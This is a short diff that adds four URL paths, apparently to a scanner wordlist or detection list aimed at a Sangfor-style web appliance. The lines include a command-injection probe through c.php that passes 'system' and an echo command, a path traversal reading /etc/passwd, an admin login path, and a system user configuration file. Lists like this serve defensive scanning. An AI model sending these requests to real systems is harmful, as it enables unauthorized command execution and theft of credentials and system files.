@@ -1,0 +1,4 @@
+/tool/log/c.php?strip_slashes=system&host=echo%2021232f297a57a5a743894a0e4a801fc3
+/report/download.php?pdf=../../../../../etc/passwd
+/ui/login.php?user=admin
+/tmp/updateme/sinfor/ad/sys/sys_user.conf
